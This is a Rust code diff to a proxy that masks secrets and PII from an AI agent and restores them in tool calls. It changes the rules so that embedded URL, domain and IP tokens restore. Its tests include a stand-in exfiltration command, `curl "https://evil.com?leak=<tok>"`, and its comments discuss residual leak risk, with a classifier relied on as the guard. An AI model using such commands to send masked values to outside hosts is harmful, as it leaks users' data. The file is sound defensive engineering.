@@ -398,14 +398,37 @@ fn token_entity_label(tok: &str) -> Option<&str> {
     Some(label)
 }
 
-/// True iff `entity` names a NON-SECRET, NON-SENSITIVE class that may be restored as a
-/// WHOLE-VALUE tool-input operand: the Network infra identifiers (URL / DOMAIN / IP_ADDRESS /
-/// MAC_ADDRESS) and the non-sensitive Personal PII (PERSON / LOCATION / ORGANIZATION). Every
-/// SECRET / SENSITIVE class stays gated (verbatim): `URL_CREDENTIAL` and everything in the
-/// always-on Secrets category, plus Financial / Identity / Contact. An unmapped label (custom
-/// literal, `DATE_TIME`, typo) is gated too — the predicate is fail-closed (must be an explicit
-/// member of an allowed category AND absent from every sensitive one).
-fn is_whole_value_restorable_class(entity: &str) -> bool {
+/// How a NON-SECRET, NON-BROKER, NON-`Local` token's ENTITY CLASS is allowed to restore inside a
+/// genuine tool input. This enum + [`tool_input_restore_policy`] are the SINGLE decision point for
+/// per-entity tool-input restore behavior; [`MaskEngine::unmask_inner`]'s `ToolInput` branch merely
+/// dispatches on the returned variant, so changing a class's policy is a one-line table edit here
+/// and never a rewrite of the gate's control flow.
+#[derive(Clone, Copy, PartialEq, Eq, Debug)]
+enum ToolInputRestore {
+    /// NEVER restore in a tool input — keep the token VERBATIM (A4b). Secrets / `URL_CREDENTIAL` /
+    /// every sensitive class / unmapped label (fail-closed).
+    Gated,
+    /// Restore ONLY when the token is the WHOLE value of the leaf (bare) or a whole JSON string
+    /// value (`"[TOK]"`, RAW source) — the A4b whole-value relaxation. Non-sensitive classes with
+    /// no request-target argument (Personal name/location/org, `MAC_ADDRESS`).
+    WholeValueOnly,
+    /// Restore REGARDLESS of position (embedded ok). The Network request-target identifiers
+    /// (URL / DOMAIN / IP_ADDRESS): an inline `curl -H ... [URL]` must reach the real target. The
+    /// auto-mode classifier (Data-Exfiltration rule) + the broker (for secrets) are the exfil
+    /// guards for this class, NOT the proxy's whole-value restriction.
+    Embedded,
+}
+
+/// The SOLE mapping from a token's entity class to its tool-input restore behavior. Data-driven so
+/// a FUTURE per-entity policy change (e.g. "URL only whole, IP embedded") is a one-line edit to the
+/// match arms below, not a change to the gate. Broker + `Local` tokens are gated by KIND in
+/// [`MaskEngine::unmask_inner`] BEFORE this fn is consulted; this covers only the non-secret,
+/// non-broker, non-`Local` entity-class decision.
+///
+/// FUTURE (config-driven override): a per-entity policy map would slot in as the FIRST arm here
+/// (look up `entity_kind`, early-return its configured `ToolInputRestore`); the built-in table
+/// below becomes the fallback. `unmask_inner` needs no change — it dispatches on the return value.
+fn tool_input_restore_policy(entity_kind: &str) -> ToolInputRestore {
     use crate::config::Category;
     const SENSITIVE: [Category; 4] = [
         Category::Secrets,
@@ -413,11 +436,24 @@ fn is_whole_value_restorable_class(entity: &str) -> bool {
         Category::Identity,
         Category::Contact,
     ];
-    if SENSITIVE.iter().any(|c| c.entity_types().contains(&entity)) {
-        return false;
+    // Secret / sensitive classes (incl. `URL_CREDENTIAL`, which lives in the always-on Secrets
+    // category): a capability secret NEVER resolves into a tool call, whole OR embedded.
+    if SENSITIVE.iter().any(|c| c.entity_types().contains(&entity_kind)) {
+        return ToolInputRestore::Gated;
     }
-    Category::Network.entity_types().contains(&entity)
-        || Category::Personal.entity_types().contains(&entity)
+    // Network request-target identifiers restore EMBEDDED — a masked URL/domain/IP embedded in an
+    // inline command (`curl -H ... [URL_target]`) must dereference to the real target.
+    if matches!(entity_kind, "URL" | "DOMAIN" | "IP_ADDRESS") {
+        return ToolInputRestore::Embedded;
+    }
+    // Non-sensitive classes with no request-target argument — a name / location / org, and
+    // `MAC_ADDRESS` (Network, but not a request target): whole-value restore only, unchanged from
+    // the A4b relaxation.
+    if entity_kind == "MAC_ADDRESS" || Category::Personal.entity_types().contains(&entity_kind) {
+        return ToolInputRestore::WholeValueOnly;
+    }
+    // Unmapped label (custom literal, `DATE_TIME`, typo): fail-closed.
+    ToolInputRestore::Gated
 }
 
 /// A `"` at byte index `q` in `bytes` is a real JSON string delimiter (not an escaped `\"`)
@@ -1592,9 +1628,11 @@ impl MaskEngine {
         // detected secrets never egress into a genuine tool call; `Other` is today's
         // non-display behavior (compaction / citation / already-executed echoes).
         ctx: UnmaskContext,
-        // Provenance of `text` for the whole-value tool-input relaxation: `RawJsonSource`
-        // (SSE) permits `JsonQuoted`; `DecodedLeaf` (walk) permits `Bare` only. Only read
-        // when `ctx == ToolInput`; irrelevant otherwise.
+        // Provenance of `text` for the tool-input restore relaxation: it selects the escape
+        // discipline. Whole-value (`WholeValueOnly`): `RawJsonSource` (SSE) permits `JsonQuoted`,
+        // `DecodedLeaf` (walk) permits `Bare` only. Embedded (`Embedded`, Network class):
+        // `RawJsonSource` JSON-escapes the spliced value, `DecodedLeaf` splices plain (serde
+        // re-serializes downstream). Only read when `ctx == ToolInput`; irrelevant otherwise.
         tool_input_source: WholeValueSource,
     ) -> Result<String, EngineError> {
         // `Local` ("owner-reveal") tokens are revealed ONLY on the display path — this
@@ -1629,48 +1667,71 @@ impl MaskEngine {
                 last = m.end();
                 continue;
             }
-            // TOOL-EGRESS GATE (A4b), RELAXED for a WHOLE-VALUE NON-SECRET handle: on a genuine
-            // tool-input surface a non-`Local` token reaching here is PII / custom-literal /
-            // Network class (broker refused by prefix above; `Local`'s fate decided above). A
-            // token that is the ENTIRE value of the leaf (bare) or a whole JSON string value
-            // (`"[TOK]"`) can only dereference to ITSELF as the operand — never be embedded as a
-            // parameter into a request to a DIFFERENT host — so restoring a NON-SECRET whole-value
-            // URL / DOMAIN / IP (or non-sensitive PII) is exfil-safe and lets a masked URL reach
-            // WebFetch.url / a Bash arg (Issue 1). Everything else stays MASKED: an EMBEDDED token,
-            // a SECRET class (`URL_CREDENTIAL` / Secrets category), and an unmapped label — so
-            // detected secrets still never resolve into a real tool call.
+            // TOOL-EGRESS GATE (A4b), dispatched through the per-entity restore POLICY: on a genuine
+            // tool-input surface a non-`Local` token reaching here is PII / custom-literal / Network
+            // class (broker refused by prefix above; `Local`'s fate decided above). The SINGLE
+            // decision point is `tool_input_restore_policy(entity)`:
+            //   * `Gated`         — SECRET / sensitive / unmapped: keep the token VERBATIM (A4b).
+            //   * `WholeValueOnly`— non-sensitive PII / `MAC_ADDRESS`: restore ONLY as a whole value
+            //                       (bare leaf, or a whole `"[TOK]"` on RAW source), else verbatim.
+            //   * `Embedded`      — Network request-target (URL/DOMAIN/IP): restore REGARDLESS of
+            //                       position, so an inline `curl -H ... [URL_target]` reaches the
+            //                       real target; the auto-mode classifier + broker are the exfil
+            //                       guards, not this gate. An unresolvable handle stays VERBATIM
+            //                       (fabricated-handle fail-loud is signalled at the proxy layer).
             if ctx == UnmaskContext::ToolInput && !is_local {
-                let restorable_class = mentry
+                let policy = mentry
                     .map(|e| e.entity_kind.as_str())
                     .or_else(|| token_entity_label(tok))
-                    .is_some_and(is_whole_value_restorable_class);
-                let mode = restorable_class
-                    .then(|| {
-                        tool_input_whole_value_mode(text, m.start(), m.end(), tool_input_source)
+                    .map_or(ToolInputRestore::Gated, tool_input_restore_policy);
+                // Resolve to plaintext (manifest first, then the cross-turn store). Computed only
+                // when the policy permits a restore, so a `Gated` secret is never even dereferenced
+                // here. `TokenKind::Local` fallback mirrors the cross-turn reveal path.
+                let resolve = || {
+                    mentry.map(|e| e.canonical_form.clone()).or_else(|| {
+                        store
+                            .reveal(tok)
+                            .or_else(|| store.reveal_for(tok, TokenKind::Local).map(|r| r.value))
                     })
-                    .flatten();
-                match mode {
-                    Some(mode) => {
-                        // Whole-value + non-secret: resolve (manifest first, then the cross-turn
-                        // store). An unresolvable handle stays VERBATIM (fabricated-handle
-                        // fail-loud is signalled at the proxy layer, never a hard deny here).
-                        let plain = mentry.map(|e| e.canonical_form.clone()).or_else(|| {
-                            store.reveal(tok).or_else(|| {
-                                store.reveal_for(tok, TokenKind::Local).map(|r| r.value)
-                            })
-                        });
-                        match (plain, mode) {
+                };
+                match policy {
+                    // SECRET / sensitive / unmapped: keep it MASKED (A4b unchanged).
+                    ToolInputRestore::Gated => out.push_str(tok),
+                    // Non-sensitive PII / MAC: restore only as a whole value, escaping per mode.
+                    ToolInputRestore::WholeValueOnly => {
+                        match tool_input_whole_value_mode(
+                            text,
+                            m.start(),
+                            m.end(),
+                            tool_input_source,
+                        ) {
                             // `JsonQuoted` splices into RAW JSON source between the two quotes →
                             // escape; `Bare` is re-serialized by serde downstream → splice raw.
-                            (Some(p), WholeValueMode::JsonQuoted) => {
-                                out.push_str(&json_escape_body(&p))
-                            }
-                            (Some(p), WholeValueMode::Bare) => out.push_str(&p),
-                            (None, _) => out.push_str(tok),
+                            Some(WholeValueMode::JsonQuoted) => match resolve() {
+                                Some(p) => out.push_str(&json_escape_body(&p)),
+                                None => out.push_str(tok),
+                            },
+                            Some(WholeValueMode::Bare) => match resolve() {
+                                Some(p) => out.push_str(&p),
+                                None => out.push_str(tok),
+                            },
+                            // Embedded / lone-quote / key: keep it MASKED (whole-value only).
+                            None => out.push_str(tok),
                         }
                     }
-                    // Embedded / secret-class / unmapped: keep it MASKED (A4b unchanged).
-                    None => out.push_str(tok),
+                    // Network request-target: restore regardless of position. Escape per SOURCE —
+                    // `RawJsonSource` (SSE / OpenAI raw JSON) splices between existing quotes, so it
+                    // MUST be JSON-escaped lest a `"`/`\` in the value corrupt the surrounding JSON;
+                    // `DecodedLeaf` (walk) is re-serialized by serde downstream, so splice PLAIN
+                    // (double-escaping would corrupt it). The `DecodedLeaf`-never-`JsonQuoted`
+                    // invariant (636712a) is preserved: DecodedLeaf never JSON-escapes here.
+                    ToolInputRestore::Embedded => match resolve() {
+                        Some(p) => match tool_input_source {
+                            WholeValueSource::RawJsonSource => out.push_str(&json_escape_body(&p)),
+                            WholeValueSource::DecodedLeaf => out.push_str(&p),
+                        },
+                        None => out.push_str(tok),
+                    },
                 }
                 last = m.end();
                 continue;
@@ -4193,28 +4254,32 @@ mod tests {
         assert_eq!(e.unmask_tool_input(&tok, &empty).unwrap(), url);
     }
 
-    // (1b) The SAME token EMBEDDED in a larger Bash-command string stays a verbatim token — an
-    // embedded handle could be composed into a request to a DIFFERENT host, so it never restores.
+    // (1b) POSTURE CHANGE (embedded-url-restore-policy): the SAME Network URL token EMBEDDED in a
+    // larger command string now RESTORES — an inline `curl [URL] | grep foo` must reach the real
+    // target. The auto-mode classifier (Data-Exfiltration rule) + the broker are the exfil guards
+    // for the Network class now, NOT the proxy's whole-value restriction. On RAW JSON SOURCE the
+    // spliced value is JSON-escaped so the surrounding JSON stays parseable.
     #[test]
-    fn tool_input_embedded_network_url_stays_verbatim() {
+    fn tool_input_embedded_network_url_restores() {
         let e = network_engine();
         let url = "https://corp.example.com/secret";
         let out = e.mask(&format!("open {url}"), Surface::UserMessage).unwrap();
         let tok = url_token(&out);
 
+        // Bare RAW source, token embedded in a command: restores in place.
         let tool = e
             .unmask_tool_input(&format!("curl {tok} | grep foo"), &out.manifest)
             .unwrap();
-        assert!(tool.contains(&tok), "embedded token must stay verbatim: {tool}");
-        assert!(!tool.contains(url), "embedded token must NOT restore: {tool}");
+        assert!(!tool.contains(&tok), "embedded Network token must restore: {tool}");
+        assert_eq!(tool, format!("curl {url} | grep foo"));
 
+        // RAW JSON source, token embedded inside a larger JSON string value: restores + JSON stays
+        // parseable (the value is JSON-escaped on splice).
         let tool2 = e
             .unmask_tool_input(&format!("{{\"command\":\"curl {tok} | grep foo\"}}"), &out.manifest)
             .unwrap();
-        assert!(
-            tool2.contains(&tok) && !tool2.contains(url),
-            "embedded-in-JSON token must stay verbatim: {tool2}"
-        );
+        let v: serde_json::Value = serde_json::from_str(&tool2).expect("parseable JSON");
+        assert_eq!(v["command"], format!("curl {url} | grep foo"));
     }
 
     // (1c) A whole-value URL_CREDENTIAL (Secrets category) stays GATED (verbatim), bare or quoted —
@@ -4260,12 +4325,14 @@ mod tests {
         );
     }
 
-    // (A4b decoded-leaf) WALK path: a serde-DECODED leaf `echo "[TOK]"` has the token EMBEDDED and
-    // quote-WRAPPED, but the `"` are literal shell content, NOT JSON delimiters. It must stay a
-    // VERBATIM token — the regression `unmask_tool_input_decoded_leaf` closes (the old shared path
-    // misread the literal quotes as `JsonQuoted` and restored the embedded URL).
+    // (636712a invariant + posture change) WALK path: a serde-DECODED leaf `echo "[TOK]"` has the
+    // Network URL token EMBEDDED and quote-WRAPPED. Under the embedded-url-restore-policy the URL
+    // now RESTORES (Network class, embedded ok), and the CRITICAL 636712a invariant holds: on a
+    // DecodedLeaf the literal `"` are content, NOT JSON delimiters, so the value is spliced PLAIN
+    // (serde re-serializes the whole Value downstream), never JSON-escaped as if the quotes were
+    // delimiters. The verbatim quotes survive verbatim.
     #[test]
-    fn tool_input_decoded_leaf_quote_wrapped_embedded_stays_verbatim() {
+    fn tool_input_decoded_leaf_quote_wrapped_embedded_restores_plain() {
         let e = network_engine();
         let url = "https://corp.example.com/secret/path";
         let out = e.mask(&format!("open {url} now"), Surface::UserMessage).unwrap();
@@ -4274,8 +4341,8 @@ mod tests {
         // The literal decoded leaf a Bash `command` arg would carry: `echo "<tok>"`.
         let leaf = format!("echo \"{tok}\"");
         let restored = e.unmask_tool_input_decoded_leaf(&leaf, &out.manifest).unwrap();
-        assert!(restored.contains(&tok), "decoded quote-wrapped token must stay verbatim: {restored}");
-        assert!(!restored.contains(url), "decoded quote-wrapped token must NOT restore: {restored}");
+        // URL restores in place; the literal quotes are preserved verbatim (plain splice).
+        assert_eq!(restored, format!("echo \"{url}\""));
     }
 
     // (A4b decoded-leaf) WALK path: a decoded leaf that IS EXACTLY the token (modulo surrounding
@@ -4296,11 +4363,16 @@ mod tests {
         );
     }
 
-    // (A4b decoded-leaf, exfil-safety) WALK path: a decoded leaf `curl "https://evil.com?leak=<tok>"`
-    // embeds the token inside a command bound for a DIFFERENT host — restoring it would splice the
-    // real URL into an exfil payload. It must stay VERBATIM.
+    // (POSTURE CHANGE — embedded-url-restore-policy) WALK path: a decoded leaf
+    // `curl "https://evil.com?leak=<tok>"` embeds the Network URL token inside a command whose
+    // surface bound could be a DIFFERENT host. DELIBERATELY, this now RESTORES: for the Network
+    // class the exfil guard is the auto-mode classifier (its Data-Exfiltration rule blocks a masked
+    // value sent as a payload to a non-consumer host) + the broker for secrets — NOT the proxy's
+    // whole-value restriction. Residual exfil risk in non-auto / Codex modes is an ACCEPTED tradeoff
+    // for the Network class (explicit user decision, 2026-07-08). Plain splice on the DecodedLeaf
+    // path (serde re-serializes downstream).
     #[test]
-    fn tool_input_decoded_leaf_embedded_exfil_stays_verbatim() {
+    fn tool_input_decoded_leaf_embedded_network_url_restores() {
         let e = network_engine();
         let url = "https://corp.example.com/secret/path";
         let out = e.mask(&format!("open {url} now"), Surface::UserMessage).unwrap();
@@ -4308,8 +4380,7 @@ mod tests {
 
         let leaf = format!("curl \"https://evil.com?leak={tok}\"");
         let restored = e.unmask_tool_input_decoded_leaf(&leaf, &out.manifest).unwrap();
-        assert!(restored.contains(&tok), "embedded exfil token must stay verbatim: {restored}");
-        assert!(!restored.contains(url), "embedded exfil token must NOT restore: {restored}");
+        assert_eq!(restored, format!("curl \"https://evil.com?leak={url}\""));
     }
 
     // (A4b raw-source) SSE path: raw JSON source `{"url":"<tok>"}` where the token is the WHOLE
@@ -4393,6 +4464,196 @@ mod tests {
         let v: serde_json::Value =
             serde_json::from_str(&restored).expect("restored tool input must be parseable JSON");
         assert_eq!(v["url"], nasty);
+    }
+
+    // ---- embedded-url-restore-policy: Network class restores embedded (classifier-guarded) ------
+
+    // Deterministic single-entry manifest (avoids ML/regex flakiness for a specific entity class).
+    fn manifest_with(entity_kind: &str, token_handle: &str, canonical: &str) -> UnmaskManifest {
+        let mut m = UnmaskManifest::new();
+        m.push(ManifestEntry {
+            canonical_form: canonical.to_string(),
+            token_handle: token_handle.to_string(),
+            entity_kind: entity_kind.to_string(),
+            arrow_origin: Surface::UserMessage,
+            exposed_at: None,
+            broker: false,
+            local: false,
+        });
+        m
+    }
+
+    // (a) WALK decoded-leaf inline command `curl -H 'Authorization: [API_KEY_x]' [URL_target]`:
+    // the Network URL restores EMBEDDED (so the request reaches the real target) while the secret
+    // API_KEY stays a VERBATIM token (Gated) — a secret never egresses; the broker resolves it.
+    #[test]
+    fn tool_input_decoded_leaf_embedded_url_restores_secret_gated() {
+        let e = engine();
+        let url_tok = "[URL_00000000aaaa]";
+        let key_tok = "[API_KEY_00000000bbbb]";
+        let url = "https://api.internal.example.com/v1";
+        let mut m = manifest_with("URL", url_tok, url);
+        m.push(ManifestEntry {
+            canonical_form: "sk-LIVE-super-secret".to_string(),
+            token_handle: key_tok.to_string(),
+            entity_kind: "API_KEY".to_string(),
+            arrow_origin: Surface::UserMessage,
+            exposed_at: None,
+            broker: false,
+            local: false,
+        });
+        let leaf = format!("curl -H 'Authorization: {key_tok}' {url_tok}");
+        let restored = e.unmask_tool_input_decoded_leaf(&leaf, &m).unwrap();
+        assert_eq!(restored, format!("curl -H 'Authorization: {key_tok}' {url}"));
+        assert!(!restored.contains("sk-LIVE-super-secret"), "secret leaked: {restored}");
+    }
+
+    // (b) SSE RAW JSON source: an EMBEDDED [URL_x] inside a LARGER JSON string value restores and is
+    // JSON-escaped, so a `"`/`\` in the value cannot corrupt the surrounding JSON (Issue 2, embedded).
+    #[test]
+    fn tool_input_raw_source_embedded_url_restores_json_escaped() {
+        let e = engine();
+        let tok = "[URL_00000000cccc]";
+        let nasty = "https://corp.example.com/a\"b\\c";
+        let m = manifest_with("URL", tok, nasty);
+        // The URL sits EMBEDDED inside a larger command string value (not the whole value).
+        let raw = format!("{{\"command\":\"curl {tok} | tee out\"}}");
+        let restored = e.unmask_tool_input(&raw, &m).unwrap();
+        let v: serde_json::Value =
+            serde_json::from_str(&restored).expect("embedded restore must keep JSON parseable");
+        assert_eq!(v["command"], format!("curl {nasty} | tee out"));
+    }
+
+    // (c) An embedded IP_ADDRESS restores; an embedded DOMAIN restores — both Network request-target.
+    #[test]
+    fn tool_input_embedded_ip_and_domain_restore() {
+        let e = engine();
+        let ip_tok = "[IP_ADDRESS_00000000dddd]";
+        let ip = "10.1.2.3";
+        let m = manifest_with("IP_ADDRESS", ip_tok, ip);
+        assert_eq!(
+            e.unmask_tool_input_decoded_leaf(&format!("ping -c1 {ip_tok} && echo ok"), &m).unwrap(),
+            format!("ping -c1 {ip} && echo ok")
+        );
+
+        let dom_tok = "[DOMAIN_00000000eeee]";
+        let dom = "internal.corp.example";
+        let m2 = manifest_with("DOMAIN", dom_tok, dom);
+        assert_eq!(
+            e.unmask_tool_input_decoded_leaf(&format!("dig {dom_tok} +short"), &m2).unwrap(),
+            format!("dig {dom} +short")
+        );
+    }
+
+    // (d) A non-sensitive Personal-PII token (PERSON) is WholeValueOnly: it stays a token when
+    // EMBEDDED (no request-target argument for a name) but restores as a WHOLE field value.
+    #[test]
+    fn tool_input_personal_pii_whole_value_only() {
+        let e = engine();
+        let tok = "[PERSON_00000000ffff]";
+        let name = "Jane Q. Doe";
+        let m = manifest_with("PERSON", tok, name);
+        // Embedded → stays a token.
+        let embedded = e
+            .unmask_tool_input_decoded_leaf(&format!("echo greeting for {tok}"), &m)
+            .unwrap();
+        assert!(embedded.contains(tok), "embedded PERSON must stay a token: {embedded}");
+        assert!(!embedded.contains(name), "embedded PERSON must NOT restore: {embedded}");
+        // Whole leaf → restores (Bare).
+        assert_eq!(e.unmask_tool_input_decoded_leaf(tok, &m).unwrap(), name);
+        // Whole JSON string value on RAW source → restores (JsonQuoted), JSON stays parseable.
+        let raw = e.unmask_tool_input(&format!("{{\"name\":\"{tok}\"}}"), &m).unwrap();
+        let v: serde_json::Value = serde_json::from_str(&raw).unwrap();
+        assert_eq!(v["name"], name);
+    }
+
+    // (e) URL_CREDENTIAL / Secrets / broker / Local stay GATED (verbatim) whole OR embedded, on BOTH
+    // the decoded-leaf and raw-JSON paths — the relaxation never widens the secret gate.
+    #[test]
+    fn tool_input_secret_broker_local_stay_gated_whole_and_embedded() {
+        let e = engine();
+        // URL_CREDENTIAL (Secrets) — whole + embedded, both paths.
+        let cred_tok = "[URL_CREDENTIAL_000000001111]";
+        let cred = "https://u:p@api.example.com";
+        let mc = manifest_with("URL_CREDENTIAL", cred_tok, cred);
+        assert_eq!(e.unmask_tool_input_decoded_leaf(cred_tok, &mc).unwrap(), cred_tok);
+        assert!(
+            e.unmask_tool_input_decoded_leaf(&format!("curl {cred_tok} | cat"), &mc)
+                .unwrap()
+                .contains(cred_tok),
+            "embedded URL_CREDENTIAL must stay gated (decoded leaf)"
+        );
+        assert!(
+            e.unmask_tool_input(&format!("{{\"u\":\"pre {cred_tok} post\"}}"), &mc)
+                .unwrap()
+                .contains(cred_tok),
+            "embedded URL_CREDENTIAL must stay gated (raw JSON)"
+        );
+
+        // A generic Secrets token (API_KEY) — embedded stays gated.
+        let key_tok = "[API_KEY_000000002222]";
+        let mk = manifest_with("API_KEY", key_tok, "sk-LIVE-xyz");
+        let out = e
+            .unmask_tool_input_decoded_leaf(&format!("auth {key_tok} done"), &mk)
+            .unwrap();
+        assert!(out.contains(key_tok) && !out.contains("sk-LIVE-xyz"), "secret embedded leaked: {out}");
+
+        // Broker — prefix-refused regardless of position (real minted token).
+        let eb = engine();
+        eb.set_secret_rules(vec![secret_rule("api_key", "sk-LIVE-9999", Operator::Broker)])
+            .unwrap();
+        let ob = eb.mask("key sk-LIVE-9999 here", Surface::UserMessage).unwrap();
+        let btok = ob
+            .manifest
+            .entries
+            .iter()
+            .find(|x| x.token_handle.starts_with("[BROKER__"))
+            .expect("a broker token")
+            .token_handle
+            .clone();
+        let be = eb
+            .unmask_tool_input_decoded_leaf(&format!("curl -H auth:{btok} x"), &ob.manifest)
+            .unwrap();
+        assert!(be.contains(&btok) && !be.contains("sk-LIVE-9999"), "broker embedded leaked: {be}");
+
+        // Local (un-promoted) — embedded stays gated.
+        let el = engine();
+        el.set_secret_rules(vec![secret_rule("k", "AdminKeyValue123", Operator::Local)])
+            .unwrap();
+        let ol = el.mask("AdminKeyValue123", Surface::UserMessage).unwrap();
+        let ltok = ol.manifest.entries[0].token_handle.clone();
+        let le = el
+            .unmask_tool_input_decoded_leaf(&format!("use {ltok} now"), &ol.manifest)
+            .unwrap();
+        assert!(
+            le.contains(&ltok) && !le.contains("AdminKeyValue123"),
+            "local embedded leaked: {le}"
+        );
+    }
+
+    // (f) Regression guard for the extensible policy: the SINGLE decision point maps each entity
+    // class to its tool-input restore behavior. A one-line edit here is the future per-entity
+    // override; this test pins the built-in table so a drift is caught.
+    #[test]
+    fn tool_input_restore_policy_mapping() {
+        use ToolInputRestore::*;
+        // Network request-target → Embedded.
+        assert_eq!(tool_input_restore_policy("URL"), Embedded);
+        assert_eq!(tool_input_restore_policy("DOMAIN"), Embedded);
+        assert_eq!(tool_input_restore_policy("IP_ADDRESS"), Embedded);
+        // Network non-request-target + non-sensitive PII → WholeValueOnly.
+        assert_eq!(tool_input_restore_policy("MAC_ADDRESS"), WholeValueOnly);
+        assert_eq!(tool_input_restore_policy("PERSON"), WholeValueOnly);
+        assert_eq!(tool_input_restore_policy("LOCATION"), WholeValueOnly);
+        assert_eq!(tool_input_restore_policy("ORGANIZATION"), WholeValueOnly);
+        // Secret / sensitive / URL_CREDENTIAL / unmapped → Gated (fail-closed).
+        assert_eq!(tool_input_restore_policy("API_KEY"), Gated);
+        assert_eq!(tool_input_restore_policy("URL_CREDENTIAL"), Gated);
+        assert_eq!(tool_input_restore_policy("US_SSN"), Gated);
+        assert_eq!(tool_input_restore_policy("EMAIL_ADDRESS"), Gated);
+        assert_eq!(tool_input_restore_policy("CREDIT_CARD"), Gated);
+        assert_eq!(tool_input_restore_policy("DATE_TIME"), Gated);
+        assert_eq!(tool_input_restore_policy("SOME_CUSTOM_LITERAL"), Gated);
     }
 
     // (3) A token-SHAPED handle the model INVENTED (absent from manifest AND store) is reported
